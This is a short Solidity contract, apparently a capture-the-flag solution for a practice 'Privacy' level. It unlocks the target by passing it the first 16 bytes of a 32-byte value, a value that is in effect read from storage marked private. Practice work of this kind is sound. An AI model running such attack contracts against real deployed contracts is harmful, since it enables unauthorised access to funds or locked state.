pragma solidity ^0.8.0;

import "./Privacy.sol";

contract PrivacyAttack {
    Privacy target;

    constructor(address _targetAddr) {
        target = Privacy(_targetAddr);
    }

    function unlock(bytes32 _data) external {
        bytes16 key = bytes16(_data);
        target.unlock(key);
    }
}
